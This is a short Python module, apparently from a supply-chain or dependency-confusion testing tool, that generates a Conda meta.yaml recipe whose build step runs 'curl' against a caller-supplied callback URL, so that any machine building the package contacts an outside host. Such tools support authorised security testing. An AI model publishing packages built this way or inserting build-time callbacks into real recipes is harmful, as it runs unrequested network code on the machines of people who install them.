"""Generate Conda recipe payload."""
from __future__ import annotations

from typing import Optional


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a minimal meta.yaml executing ``callback``."""
    cmd = f"curl -m5 {callback}"
    return (
        f"package:\n  name: {package}\n  version: 0.0.1\n"
        f"build:\n  script: {cmd}\n"
    )
